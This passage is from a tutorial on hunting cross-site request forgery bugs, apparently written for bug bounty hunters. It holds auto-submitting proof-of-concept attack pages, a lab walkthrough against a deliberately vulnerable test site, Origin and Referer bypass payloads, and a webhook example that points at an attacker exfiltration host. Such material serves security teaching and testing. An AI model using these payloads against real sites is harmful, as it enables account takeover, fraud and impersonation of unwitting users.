│ CAPTCHA                   │ Moderate   │ CAPTCHA solving services           │
└───────────────────────────┴────────────┴────────────────────────────────────┘
```

---

## 6. 🗺️ Where to Look — Attack Surface Mapping

CSRF only works on **state-changing** requests. You're not looking at every endpoint — you're looking at endpoints that **modify data, settings, or account state**.

### The Golden Rule

> **Every POST, PUT, PATCH, DELETE request is a potential CSRF target.**
> Every GET request that changes state is a **guaranteed** CSRF target.

### High-Value CSRF Targets (Prioritized)

```
🔴 CRITICAL — Test These First (Direct Account Impact):
├── Email change           POST /account/change-email
├── Password change        POST /account/change-password
├── 2FA enable/disable     POST /account/2fa/toggle
├── Add admin user         POST /admin/users/create
├── Fund transfer          POST /banking/transfer
├── Payment method add     POST /billing/add-card
├── API key creation       POST /api/keys/create
├── Account deletion       POST /account/delete
├── Grant permissions      POST /admin/grant-role
└── OAuth app authorize    POST /oauth/authorize

🟡 HIGH — Test After Critical:
├── Profile update         POST /profile/update
├── Address change         POST /settings/address
├── Notification settings  POST /settings/notifications
├── Privacy settings       POST /settings/privacy
├── Team member invite     POST /team/invite
├── Subscription change    POST /billing/plan
├── Webhook configuration  POST /integrations/webhooks
├── Connected app removal  POST /apps/revoke
├── Password reset request POST /auth/forgot-password
└── Session management     POST /sessions/revoke-all

🟢 MEDIUM — Test When You Have Time:
├── Post/comment creation  POST /posts/create
├── Follow/unfollow        POST /users/follow
├── Like/vote              POST /content/like
├── Newsletter sub/unsub   POST /newsletter/toggle
├── Theme/language change  POST /preferences/update
├── File upload            POST /files/upload
├── Export generation      POST /export/generate
└── Feedback/survey submit POST /feedback/submit
```

### Hidden CSRF Surfaces Most Hunters Miss

#### 1. Admin Panels

Admin endpoints often lack CSRF protection because developers think "only admins access this":

```
POST /admin/create-admin-user      ← If admin is CSRFed, new admin created
POST /admin/settings/update        ← Modify application settings
POST /admin/users/1002/ban         ← Ban arbitrary users
POST /admin/export/all-data        ← Trigger full data export
POST /admin/maintenance/reset-db   ← Destructive operations
```

#### 2. API Endpoints That Accept Both JSON and Form Data

Many frameworks auto-parse multiple content types:

```python
# Flask/Python
@app.route('/api/update', methods=['POST'])
def update():
    # request.json OR request.form — both work
    data = request.get_json(force=True, silent=True) or request.form
```

If the API accepts `application/x-www-form-urlencoded`, it's CSRF-able via forms.

#### 3. OAuth/Social Login Flows

```
GET /oauth/callback?code=ATTACKER_CODE&state=VICTIM_STATE
→ Link attacker's social account to victim's account (Login CSRF variant)

POST /settings/connect-github
→ CSRF connects attacker's GitHub to victim's account
```

#### 4. Webhook and Integration Endpoints

```
POST /integrations/slack/configure
{"webhook_url": "https://attacker.com/exfil"}
→ CSRF redirects all Slack notifications to attacker
```

#### 5. File Upload as State Change

```
POST /profile/avatar (multipart/form-data)
→ CSRF to replace profile picture with offensive content
→ Gets the victim banned from the platform

POST /documents/upload
→ CSRF to upload malicious file to victim's account
```

#### 6. WebSocket Initialization

```
The WebSocket upgrade request is vulnerable:
GET /ws/chat?room=attacker-controlled
Upgrade: websocket

If the server doesn't validate Origin → CSRF on WebSocket establishment
```

### Quick Surface Scan Method

Before deep testing, do a **quick scan** of Burp HTTP History:

```
In Burp → HTTP History:
1. Filter: Show only POST/PUT/PATCH/DELETE requests
2. For each request, check:
   ├── Does it have a CSRF token? (csrf_token, _token, X-CSRF-Token, etc.)
   ├── What Content-Type does it use?
   ├── Does it have SameSite cookie?
   ├── Does it check Origin/Referer?
   └── What state does it change?

3. Create a target list:
   ┌──────┬───────────────────────────────┬──────┬────────┬──────────┐
   │  #   │ Endpoint                      │Method│ CSRF   │ State    │
   │      │                               │      │ Token? │ Change   │
   ├──────┼───────────────────────────────┼──────┼────────┼──────────┤
   │ 1    │ /account/change-email         │POST  │ ❌ No   │ Email    │
   │ 2    │ /account/change-password      │POST  │ ✅ Yes  │ Password │
   │ 3    │ /settings/update              │POST  │ ❌ No   │ Settings │
   │ 4    │ /api/profile/update           │PUT   │ ❌ No   │ Profile  │
   │ 5    │ /admin/grant-role             │POST  │ ❌ No   │ Role     │
   └──────┴───────────────────────────────┴──────┴────────┴──────────┘
   
   → Endpoints 1, 3, 4, 5 are likely vulnerable — test them first
   → Endpoint 2 has a token — test if it's actually validated
```

---

## 7. 🔬 CSRF Methodology — Step by Step

This is your repeatable process. Follow it every time.

### Overview: The 6-Step CSRF Hunting Process

```
┌─────────────────────────────────────────────────────────────────────┐
│                     CSRF HUNTING METHODOLOGY                        │
│                                                                     │
│   Step 1: Identify State-Changing Endpoints                         │
│       ↓                                                             │
│   Step 2: Analyze Defenses (token? SameSite? Origin? Referer?)      │
│       ↓                                                             │
│   Step 3: Test Token Validation (remove, reuse, cross-session)      │
│       ↓                                                             │
│   Step 4: Build Proof of Concept (HTML page)                        │
│       ↓                                                             │
│   Step 5: Test PoC in Real Browser (must work end-to-end)           │
│       ↓                                                             │
│   Step 6: Escalate & Report (maximize impact, chain if possible)    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

### Step 1: Identify State-Changing Endpoints

Browse the entire application with Burp proxy active. Use every feature:

```
Actions to perform while proxied:
☐ Change your email address
☐ Change your password
☐ Update your profile (name, bio, avatar)
☐ Change notification settings
☐ Change privacy settings
☐ Connect/disconnect OAuth apps
☐ Add/remove payment methods
☐ Create/delete content (posts, comments)
☐ Invite team members
☐ Change roles/permissions
☐ Enable/disable 2FA
☐ Generate/revoke API keys
☐ Submit support tickets
☐ Change language/theme preferences
☐ Subscribe/unsubscribe from newsletters
```

Each action generates a request in Burp. Those are your targets.

---

### Step 2: Analyze Defenses on Each Endpoint

For each state-changing request, answer these questions:

```
Defense Analysis Checklist:

CSRF Token:
☐ Is there a CSRF token in the request? (form field, header, or query param)
☐ Where is it? (hidden form field, X-CSRF-Token header, cookie)
☐ What does it look like? (length, format, randomness)
☐ Is it the same every time? (reload page, compare tokens)

Cookies:
☐ What is the SameSite attribute? (Strict, Lax, None, absent?)
☐ Check: Set-Cookie: session=xxx; SameSite=??? in response headers
☐ If absent → modern browsers default to Lax

Headers:
☐ Does the server check the Origin header?
☐ Does the server check the Referer header?
☐ Is a custom header required? (X-Requested-With, etc.)

Content-Type:
☐ What Content-Type does the request use?
☐ application/json? → Preflight will block cross-origin
☐ application/x-www-form-urlencoded? → Form-submittable, no preflight
☐ multipart/form-data? → Form-submittable, no preflight

Other:
☐ Does the action require current password?
☐ Does the action require CAPTCHA?
☐ Is the action rate-limited?
```

---

### Step 3: Test Token Validation

Even when a CSRF token is present, it might not be properly validated. Test systematically:

```
Test 1: Remove the token entirely
─────────────────────────────────
Original request:
POST /change-email HTTP/1.1
email=new@test.com&csrf_token=abc123

Tampered request:
POST /change-email HTTP/1.1
email=new@test.com
(csrf_token parameter removed)

→ 200 OK? Token is not validated! CSRF possible.
→ 403? Token is validated. Try next test.

Test 2: Send empty token
─────────────────────────
POST /change-email HTTP/1.1
email=new@test.com&csrf_token=

→ 200 OK? Empty string accepted — CSRF possible.

Test 3: Send wrong token
──────────────────────────
POST /change-email HTTP/1.1
email=new@test.com&csrf_token=AAAA-BBBB-CCCC-DDDD

→ 200 OK? Any value accepted — CSRF possible.

Test 4: Use another user's token
─────────────────────────────────
1. Get a CSRF token from Account A
2. Try using it in a request from Account B's session
→ 200 OK? Token not tied to session — CSRF possible.

Test 5: Use a token from a different endpoint
──────────────────────────────────────────────
1. Get CSRF token from /settings page
2. Use it in /change-email request
→ 200 OK? Token not tied to endpoint — CSRF possible.

Test 6: Reuse an old token
───────────────────────────
1. Get CSRF token, use it once
2. Use the same token again
→ 200 OK? Token not invalidated after use — CSRF possible.

Test 7: Decode and forge the token
───────────────────────────────────
1. Base64 decode the token: atob("YWJjMTIz") = "abc123"
2. If it's a simple encoding, forge your own
3. If it's timestamp-based, predict the next one
```

---

### Step 4: Build the Proof of Concept

Once you've confirmed the endpoint is vulnerable, create an HTML PoC:

**Template — POST form-encoded:**

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC — [Target] [Action]</title></head>
<body>
<h1>Loading...</h1>
<form id="csrf-form" action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="evil@hacker.com">
    <!-- Add more fields as needed -->
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

**Template — Multiple parameters:**

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/api/profile/update" method="POST">
    <input type="hidden" name="email" value="evil@hacker.com">
    <input type="hidden" name="name" value="CSRFed User">
    <input type="hidden" name="phone" value="+1-555-EVIL">
    <input type="hidden" name="bio" value="Account compromised via CSRF">
</form>
</body>
</html>
```

**Template — JSON body via text/plain:**

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
    <input type="hidden" 
           name='{"email":"evil@hacker.com","x":"' 
           value='"}'>
</form>
</body>
</html>
```

**Template — GET-based CSRF:**

```html
<!DOCTYPE html>
<html>
<body>
<h1>You won a prize! 🎉</h1>
<!-- Silently fires the CSRF in the background -->
<img src="https://target.com/settings/change-email?email=evil@hacker.com" 
     style="display:none">
</body>
</html>
```

---

### Step 5: Test PoC in Real Browser

**This step is critical.** A PoC that works in Burp Repeater might not work in a real browser due to SameSite cookies, CORS, or other browser protections.

```
Testing procedure:
1. Log into the target application as the victim in Browser A (e.g., Chrome)
2. Open the PoC HTML file in the SAME browser (new tab, or hosted on localhost)
3. The PoC should auto-submit
4. Check: Did the state change happen?
   ├── Go back to the target app
   ├── Verify: email changed? settings modified? data created?
   └── If YES → CSRF confirmed ✅

Hosting the PoC:
├── Local file: Open the .html file directly (file:// protocol)
│   ⚠️ Some cookies may not be sent from file:// origins
├── Python HTTP server: python3 -m http.server 8888
│   → Open http://localhost:8888/poc.html
├── Public hosting: Use a VPS or Burp Collaborator
│   → Required for real-world testing
└── Burp Suite: Use Burp's built-in CSRF PoC generator
```

---

### Step 6: Escalate & Report

Before reporting, think about maximizing impact:

```
Escalation questions:
☐ Can this CSRF change the email? → Email change → Password reset → ATO
☐ Can this CSRF disable 2FA? → Combined with credential stuffing → ATO
☐ Can this CSRF create an admin user? → Full app takeover
☐ Can this be combined with XSS? → Steal CSRF token → Bypass all protections
☐ Can this be combined with clickjacking? → Victim doesn't need to visit evil site
☐ Is the endpoint used by admins? → CSRF on admin = higher impact
☐ Can this be triggered via email? → Embed <img> in email → zero-click
☐ Can multiple actions be chained? → CSRF worm (self-propagating)
```

---

## 8. 🔧 Burp Suite Setup for CSRF Hunting

### Burp Configuration for CSRF

#### Proxy Setup (Standard)

```
Burp → Proxy → Options:
├── Proxy Listeners: 127.0.0.1:8080
├── Intercept Client Requests: ✅
├── Intercept Server Responses: ✅ (IMPORTANT for CSRF — need to read tokens)
└── Install Burp CA cert in browser
```

#### HTTP History Filtering for CSRF

```
Burp → Proxy → HTTP History → Filter:
├── Method: Show POST, PUT, PATCH, DELETE (state-changing)
├── MIME type: Show HTML, JSON (where forms and APIs live)
├── Status: Show 200, 302, 403 (successful and blocked requests)
└── Search: Filter by "csrf", "token", "_token", "X-CSRF"
```

### The Built-In CSRF PoC Generator (★ MOST USEFUL ★)

Burp Suite has a **built-in tool** to generate CSRF PoC HTML pages:

```
How to use:
1. Find a vulnerable POST request in HTTP History
2. Right-click → Engagement tools → Generate CSRF PoC

3. Burp generates an HTML page with:
   ├── A form that mirrors the original request
   ├── All parameters filled in with the request values
   ├── Auto-submit JavaScript
   └── Options to include/exclude parameters

4. Click "Test in browser" → Opens the PoC in your browser
5. If the action succeeds → CSRF confirmed!

CSRF PoC Generator Options:
├── ☑ Auto-submit script         (adds onload submit)
├── ☐ Include cookies in form    (for cookie-based CSRF)
├── Content-Type override:
│   ├── application/x-www-form-urlencoded (default)
│   ├── multipart/form-data
│   └── text/plain (for JSON bypass)
└── Method override (POST, GET, etc.)
```

### Essential Burp Extensions for CSRF

#### 1. CSRF Scanner (BApp Store)

```
What it does:
├── Automatically identifies endpoints missing CSRF tokens
├── Tests token validation (removes token, tests empty, etc.)
├── Flags state-changing GET requests
└── Generates risk ratings

Setup:
1. Install from BApp Store
2. Right-click target in Site Map → Scan → CSRF checks
3. Results appear in Scanner tab
```

#### 2. CSRFPoc (BApp Store)

```
What it does:
├── Enhanced CSRF PoC generation
├── Supports JSON body PoCs
├── Supports multipart PoC
├── Auto-encodes special characters
└── One-click browser testing
```

#### 3. Logger++ (BApp Store)

```
What it does for CSRF hunting:
├── Advanced filtering: "Column Content-Type contains json"
├── Highlight rules: Color requests without CSRF tokens
├── Export: Export all POST requests for batch analysis
└── Regex: Find all requests containing "csrf|token|_token"
```

#### 4. Param Miner

```
Can discover hidden CSRF token parameters:
├── Sometimes CSRF token has a non-standard name
├── Param Miner fuzzes for hidden form fields
└── Can find: authenticity_token, _csrf, nonce, etc.
```

### Burp Repeater Workflow for CSRF

```
Step-by-step:
│
│  1. Find a POST request: POST /change-email
│     With parameters: email=new@test.com&csrf_token=abc123
│
│  2. Send to Repeater (Ctrl+R)
│
│  3. Create multiple tabs:
│     ├── Tab 1: "Original"        → Untouched request
│     ├── Tab 2: "No Token"        → csrf_token parameter removed
│     ├── Tab 3: "Empty Token"     → csrf_token=
│     ├── Tab 4: "Wrong Token"     → csrf_token=AAAA
│     ├── Tab 5: "Old Token"       → csrf_token=(previously used token)
│     └── Tab 6: "No Referer"      → Referer header removed
│
│  4. Send each tab and compare:
│     ├── Tab 1: 200 OK (baseline — should work)
│     ├── Tab 2: 200 OK? → TOKEN NOT VALIDATED → CSRF! 🔴
│     ├── Tab 3: 200 OK? → EMPTY TOKEN ACCEPTED → CSRF! 🔴
│     ├── Tab 4: 200 OK? → ANY TOKEN ACCEPTED → CSRF! 🔴
│     ├── Tab 5: 200 OK? → TOKEN REUSABLE → CSRF! 🔴
│     └── Tab 6: 200 OK? → REFERER NOT CHECKED → Note this
│
│  5. If any test returns 200 → Build PoC → Test in browser
```

### Checking SameSite Cookies in Burp

```
In Burp → HTTP History:
1. Find the login/session-setting response
2. Look at response headers:
   Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Lax

3. Check each cookie:
   ├── SameSite=Strict  → Very hard to CSRF
   ├── SameSite=Lax     → POST CSRF blocked, GET CSRF possible
   ├── SameSite=None    → All CSRF types possible
   └── SameSite absent  → Browser defaults to Lax (modern)

4. Also check response headers for CORS:
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
   → If both present → XHR/fetch CSRF possible even with JSON
```

### Match & Replace Rules for CSRF Testing

```
Burp → Proxy → Options → Match and Replace:

Rule 1: Strip Referer header (test Referer validation)
├── Type: Request header
├── Match: ^Referer:.*$
├── Replace: (empty)
├── Regex: ✅

Rule 2: Strip Origin header
├── Type: Request header
├── Match: ^Origin:.*$
├── Replace: (empty)
├── Regex: ✅

Rule 3: Set null Origin
├── Type: Request header
├── Match: ^Origin:.*$
├── Replace: Origin: null
├── Regex: ✅

Rule 4: Remove CSRF token from body
├── Type: Request body
├── Match: &?csrf_token=[^&]*
├── Replace: (empty)
├── Regex: ✅
```

---

## 9. 🧪 Hands-On Lab: testphp.vulnweb.com

Let's walk through finding and exploiting CSRF on Acunetix's intentionally vulnerable application.

> **Target:** http://testphp.vulnweb.com
> **Legal:** Yes — deliberately vulnerable for testing
> **Test account:** test / test

### Step 1: Explore and Identify State-Changing Endpoints

Open the target with Burp proxy active and browse:

```
Pages to visit:
http://testphp.vulnweb.com/                 → Homepage
http://testphp.vulnweb.com/login.php        → Login
http://testphp.vulnweb.com/signup.php       → Registration  
http://testphp.vulnweb.com/userinfo.php     → Profile (after login)
http://testphp.vulnweb.com/guestbook.php    → Guestbook (public posts)
http://testphp.vulnweb.com/cart.php         → Shopping cart
http://testphp.vulnweb.com/comment.php      → Comments
```

**Login with the test account:**
```
Username: test
Password: test
```

### Step 2: Analyze the Profile Update Request

After logging in, visit the profile page and update your info:

```
Burp captures:

POST /userinfo.php HTTP/1.1
Host: testphp.vulnweb.com
Content-Type: application/x-www-form-urlencoded
Cookie: login=test%2Ftest

uression=test&uphone=123456&uaddress=test+street&uemail=test@test.com&ucard=1234567890&update=update
```

**Defense analysis:**

```
☐ CSRF token?         → ❌ NO — No csrf_token parameter anywhere
☐ SameSite cookie?    → ❌ NO — Cookie has no SameSite attribute
☐ Origin check?       → ❌ NO — No Origin validation
☐ Referer check?      → ❌ NO — No Referer validation
☐ Custom header?      → ❌ NO — No X-Requested-With requirement
☐ Re-authentication?  → ❌ NO — No current password needed
☐ Content-Type check? → ❌ NO — Standard form-encoded

VERDICT: COMPLETELY UNPROTECTED — CSRF is trivial ✅
```

### Step 3: Build the CSRF PoC

**PoC to change the victim's credit card number and email:**

```html
<!DOCTYPE html>
<html>
<head><title>Free Anime Wallpapers!</title></head>
<body>
<h1>🎌 Loading your wallpapers...</h1>

<!-- This form silently changes the victim's profile on testphp.vulnweb.com -->
<form id="csrf" action="http://testphp.vulnweb.com/userinfo.php" method="POST">
    <input type="hidden" name="uression" value="hacked_session">
    <input type="hidden" name="uphone" value="555-EVIL">
    <input type="hidden" name="uaddress" value="123 Hacker Lane">
    <input type="hidden" name="uemail" value="evil@hacker.com">
    <input type="hidden" name="ucard" value="9999888877776666">
    <input type="hidden" name="update" value="update">
</form>

<script>
    document.getElementById('csrf').submit();
</script>
</body>
</html>
```

### Step 4: Test the PoC

```
Testing:
1. Log into testphp.vulnweb.com as test/test in your browser
2. Save the PoC as csrf_poc.html on your local machine
3. Open csrf_poc.html in the SAME browser (new tab)
4. The form auto-submits
5. Go back to http://testphp.vulnweb.com/userinfo.php
6. Check: Email changed to evil@hacker.com? ← CONFIRMED CSRF ✅
   Check: Credit card changed to 9999888877776666? ← CONFIRMED ✅
```

### Step 5: Test the Guestbook (Stored Content via CSRF)

The guestbook allows posting messages:

```
POST /guestbook.php HTTP/1.1
Host: testphp.vulnweb.com
Content-Type: application/x-www-form-urlencoded
Cookie: login=test%2Ftest

name=test&text=Hello+World&submit=Submit
```

**CSRF PoC to post on the guestbook as the victim:**

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="http://testphp.vulnweb.com/guestbook.php" method="POST">
    <input type="hidden" name="name" value="victim_user">
    <input type="hidden" name="text" 
           value="CSRF Proof of Concept - This message was posted without the user's knowledge">
    <input type="hidden" name="submit" value="Submit">
</form>
</body>
</html>
```

**Impact:** An attacker can post messages as any logged-in user. Combined with XSS payloads in the message field, this becomes a **CSRF + Stored XSS chain**.

### Step 6: Test the Shopping Cart (CSRF on Purchase Flow)

```
POST /cart.php HTTP/1.1
Host: testphp.vulnweb.com
Content-Type: application/x-www-form-urlencoded

id=1&quantity=100&submit=add

CSRF PoC to add 100 items to victim's cart:
```

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="http://testphp.vulnweb.com/cart.php" method="POST">
    <input type="hidden" name="id" value="1">
    <input type="hidden" name="quantity" value="100">
    <input type="hidden" name="submit" value="add">
</form>
</body>
</html>
```

### Step 7: Test Login CSRF

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<!-- Force victim to log into attacker's account -->
<form action="http://testphp.vulnweb.com/login.php" method="POST">
    <input type="hidden" name="uname" value="attacker_account">
    <input type="hidden" name="pass" value="attacker_password">
</form>
</body>
</html>
```

**Impact:** Victim is now logged into attacker's account. Any data they enter goes to the attacker's account.

### Summary of Findings on testphp.vulnweb.com

```
┌───┬────────────────────────────────────────┬──────────┬───────────────────────┐
│ # │ Vulnerability                          │ Severity │ Impact                │
├───┼────────────────────────────────────────┼──────────┼───────────────────────┤
│ 1 │ CSRF on profile update (email + card)  │ Critical │ Account takeover via  │
│   │                                        │          │ email change + card   │
│   │                                        │          │ theft                 │
│ 2 │ CSRF on guestbook posting              │ Medium   │ Impersonation +       │
│   │                                        │          │ potential stored XSS  │
│ 3 │ CSRF on shopping cart                  │ Low      │ Cart manipulation     │
│ 4 │ Login CSRF                             │ Medium   │ Session fixation /    │
│   │                                        │          │ data harvesting       │
│ 5 │ No CSRF protection on any endpoint     │ High     │ Application-wide      │
│   │                                        │          │ vulnerability         │
└───┴────────────────────────────────────────┴──────────┴───────────────────────┘

Root Cause: The application has ZERO CSRF defenses:
├── No CSRF tokens anywhere
├── No SameSite cookies
├── No Origin/Referer validation
├── No re-authentication for sensitive actions
└── Credentials stored in plaintext cookie (login=test%2Ftest)
```

---

## 10. 🌐 Real-World Hunting Walkthrough

This section simulates hunting CSRF on a modern production SaaS application with actual defenses in place — much harder than testphp.vulnweb.com.

### The Target Profile

```
Application: A SaaS project management tool (like Notion/Asana)
Tech Stack: React frontend, Node.js/Express API, PostgreSQL
Auth: JWT in HttpOnly cookie + CSRF token
Defenses observed:
├── CSRF tokens on most forms
├── SameSite=Lax on session cookie
├── Content-Type: application/json on API endpoints
└── Origin header checked on some endpoints
```

### Phase 1: Map All State-Changing Requests

```
Burp HTTP History analysis (POST/PUT/PATCH/DELETE only):

# Account Management
POST /api/v2/account/email          → Change email (JSON, has csrf_token)
POST /api/v2/account/password       → Change password (JSON, has csrf_token)
POST /api/v2/account/2fa/disable    → Disable 2FA (JSON, has csrf_token)
DELETE /api/v2/account               → Delete account (JSON, has csrf_token)

# Profile
PUT /api/v2/profile                  → Update profile (JSON, has csrf_token)
POST /api/v2/profile/avatar          → Upload avatar (multipart, has csrf_token)

# Settings
PUT /api/v2/settings                 → Update settings (JSON, has csrf_token)
POST /api/v2/settings/notifications  → Notification prefs (JSON, NO csrf_token!)  ← 🔴
POST /api/v2/settings/connected-apps → Connect OAuth app (JSON, has csrf_token)

# Team Management
POST /api/v2/team/invite             → Invite member (JSON, has csrf_token)
PUT /api/v2/team/member/{id}/role    → Change role (JSON, NO csrf_token!) ← 🔴
DELETE /api/v2/team/member/{id}      → Remove member (JSON, has csrf_token)

# Workspace
POST /api/v2/workspace/create        → Create workspace (JSON, has csrf_token)
PUT /api/v2/workspace/{id}/settings  → Workspace settings (JSON, has csrf_token)

# Legacy Endpoints (discovered via JS source analysis)
POST /api/v1/profile/update          → Legacy profile update (form-encoded!) ← 🔴
POST /legacy/settings                → Old settings page (form-encoded!)      ← 🔴
GET  /api/v1/account/deactivate?confirm=true → GET state change!             ← 🔴
```

### Phase 2: Prioritize Targets

```
Found 5 potential CSRF targets:

🔴 Priority 1: POST /api/v2/settings/notifications (no CSRF token)
   → But it's JSON + SameSite=Lax → POST blocked by SameSite
   → Test: Does it accept form-encoded Content-Type?

🔴 Priority 2: PUT /api/v2/team/member/{id}/role (no CSRF token)
   → JSON body, but critical action (role change = privilege escalation)
   → Test: Content-Type bypass

🔴 Priority 3: POST /api/v1/profile/update (legacy, form-encoded!)
   → No CSRF token + form-encoded = classic CSRF!
   → But SameSite=Lax blocks POST... unless cookie is SameSite=None
   
🔴 Priority 4: POST /legacy/settings (legacy, form-encoded!)
   → Same as above — check SameSite

🔴 Priority 5: GET /api/v1/account/deactivate?confirm=true
   → GET + state change + SameSite=Lax = works via top-level navigation!
```

### Phase 3: Deep Testing

**Test Target 5 First (GET-based state change — most likely to succeed):**

```
GET /api/v1/account/deactivate?confirm=true HTTP/1.1
Host: target.com
Cookie: session=eyJ...; SameSite=Lax

Response: 200 OK — Account deactivated!

SameSite=Lax allows this because:
→ It's a GET request
→ If triggered via top-level navigation (link click, window.location),
   Lax cookies ARE sent

PoC:
<html>
<body>
<script>
window.location = "https://target.com/api/v1/account/deactivate?confirm=true";
</script>
</body>
</html>

Result: ✅ CSRF CONFIRMED — Can deactivate ANY user's account via link click
Severity: HIGH
```

**Test Target 3 (Legacy endpoint — form-encoded):**

```
1. First check: Does the legacy endpoint share the same session cookie?
   → Yes! Same session cookie used across /api/v1/ and /api/v2/

2. Check SameSite on the specific cookie:
   Set-Cookie: session=eyJ...; Path=/; HttpOnly; Secure; SameSite=Lax

3. SameSite=Lax blocks POST from cross-site → BLOCKED ❌

4. BUT: Check if there's a second auth cookie without SameSite:
   Set-Cookie: legacy_session=abc123; Path=/legacy; HttpOnly
   → No SameSite attribute! On old browsers → treated as None
   → On modern browsers → defaults to Lax

5. Try the request without the main session cookie, using only legacy_session:
   → Does the legacy endpoint accept legacy_session alone?
   → If YES → and legacy_session has SameSite=None → CSRF possible!
```

**Test Target 2 (JSON endpoint without CSRF token):**

```
Original request:
PUT /api/v2/team/member/usr_7742/role HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=eyJ...

{"role": "admin"}

Test 1: Change Content-Type to form-encoded
PUT /api/v2/team/member/usr_7742/role HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJ...

role=admin

→ If 200 OK → Server accepts form-encoded → CSRF possible via form
→ If 400/415 → Server requires JSON → Need text/plain trick or CORS

Test 2: text/plain bypass
PUT /api/v2/team/member/usr_7742/role HTTP/1.1
Content-Type: text/plain
Cookie: session=eyJ...

{"role": "admin"}

→ If 200 OK → Server parses text/plain as JSON → CSRF via form enctype

Test 3: Check CORS
OPTIONS /api/v2/team/member/usr_7742/role HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type

→ Check Access-Control-Allow-Origin in response
→ If * or reflects origin → fetch-based CSRF possible
```

### Phase 4: Results

```
┌───┬─────────────────────────────────────────┬───────────────┬──────────┐
│ # │ Finding                                 │ Status        │ Severity │
├───┼─────────────────────────────────────────┼───────────────┼──────────┤
│ 1 │ GET /api/v1/account/deactivate          │ ✅ CONFIRMED   │ High     │
│   │ (account deactivation via GET + CSRF)   │               │          │
│ 2 │ PUT /team/member role change             │ ✅ CONFIRMED   │ High     │
│   │ (accepts form-encoded, no CSRF token)   │ (via text/    │          │
│   │                                         │  plain trick) │          │
│ 3 │ POST /api/v1/profile/update             │ ❌ BLOCKED     │ —        │
│   │ (SameSite=Lax blocks POST)              │               │          │
│ 4 │ POST /legacy/settings                   │ ❌ BLOCKED     │ —        │
│   │ (SameSite=Lax blocks POST)              │               │          │
│ 5 │ POST /settings/notifications            │ ❌ BLOCKED     │ —        │
│   │ (JSON required, CORS strict)            │               │          │
└───┴─────────────────────────────────────────┴───────────────┴──────────┘
```

### Lessons from Real-World Hunting

```
1. Legacy endpoints are goldmines
   → Modern API has protections, but /api/v1/ and /legacy/ don't

2. GET state changes defeat SameSite=Lax
   → Lax only blocks cross-site POST, not GET

3. Content-Type flexibility = CSRF surface
   → If server accepts form-encoded AND JSON → CSRF via forms

4. Missing CSRF token ≠ automatic CSRF
   → SameSite cookies can block it even without tokens
   → You must test in a REAL BROWSER to confirm

5. Check ALL cookies, not just the main session
   → Legacy cookies, tracking cookies, or secondary auth cookies
      may have different SameSite attributes
```

---

## 11. 🔓 Bypassing CSRF Protections

This is the advanced section. When you find a state-changing endpoint with some protection, these are the techniques to try.

### Bypass 1: Token Removal

The simplest bypass. Just delete the token parameter:

```
Original:
POST /change-email HTTP/1.1
email=evil@hacker.com&csrf_token=abc123

Bypass:
POST /change-email HTTP/1.1
email=evil@hacker.com

Why it works: Developers add the token to the form but forget to
validate it server-side. Or the validation code has a bug:

# Vulnerable Python code
token = request.form.get('csrf_token')
if token and token != session.get('csrf_token'):  # ← Bug!
    abort(403)
# If token is None (parameter missing) → the `if token` is False
# → Check is skipped → CSRF works!
```

### Bypass 2: Empty Token

```
POST /change-email HTTP/1.1
email=evil@hacker.com&csrf_token=

# Vulnerable code:
if request.form.get('csrf_token') != session['csrf_token']:
    abort(403)
# If session has no CSRF token set → session['csrf_token'] = None
# "" != None → True → 403
# BUT if developer uses: if not token or token != session_token:
# "" is falsy → "not token" is True → depends on logic
```

### Bypass 3: Swap HTTP Method

```
Original (POST protected):
POST /change-email HTTP/1.1
csrf_token=abc123&email=evil@hacker.com → 200 OK

Try GET:
GET /change-email?email=evil@hacker.com HTTP/1.1 → 200 OK?!

Why: Many frameworks (Rails, Django, Express) have separate CSRF
middleware for POST but not GET. And some controller methods accept
both GET and POST.

Also try:
PUT /change-email → might skip POST-specific CSRF middleware
PATCH /change-email → same
```

### Bypass 4: Token Not Tied to Session (Cross-Session Token)

```
1. Log into Account A
2. Copy Account A's CSRF token: "token_A_abc123"
3. Log into Account B
4. Use Account A's token in Account B's request:

POST /change-email HTTP/1.1
Cookie: session=ACCOUNT_B_SESSION
email=evil@hacker.com&csrf_token=token_A_abc123

If 200 OK → Token is not tied to session → CSRF possible!

Attack: Attacker uses their OWN valid CSRF token in the PoC.
Since it's valid (just for the wrong session), the server accepts it.
```

### Bypass 5: Token from Another Page/Endpoint

```
1. Get CSRF token from a public page (e.g., /contact form)
2. Use that token on a sensitive endpoint (e.g., /change-email)

If different endpoints share the same token pool → bypass
```

### Bypass 6: Null Origin Bypass

```
If server checks Origin header:

Normal: Origin: https://target.com → Allowed
Evil:   Origin: https://evil.com   → Blocked
Bypass: Origin: null               → ???

How to send null Origin:
<iframe sandbox="allow-forms allow-scripts" 
        srcdoc='<form action="https://target.com/change-email" method="POST">
                 <input name="email" value="evil@hacker.com">
                </form>
                <script>document.forms[0].submit()</script>'>
</iframe>

Sandboxed iframes send Origin: null.
Many servers have: if (origin === null) allow; // For file:// and data: URIs
```

### Bypass 7: Referer Header Suppression

```
If server checks Referer header:

Normal:  Referer: https://target.com/settings → Allowed
Evil:    Referer: https://evil.com/            → Blocked
Bypass:  (No Referer at all)                   → ???

Suppress Referer:
<meta name="referrer" content="no-referrer">
<form action="https://target.com/change-email" method="POST">
    <input name="email" value="evil@hacker.com">
</form>

Many servers allow requests with NO Referer header because
legitimate scenarios can suppress it (HTTPS→HTTP, privacy settings).
```

### Bypass 8: Referer Validation Flaws

```
If server checks Referer contains "target.com":

Bypass 1: Create a page at evil.com/target.com/poc.html
→ Referer: https://evil.com/target.com/poc.html
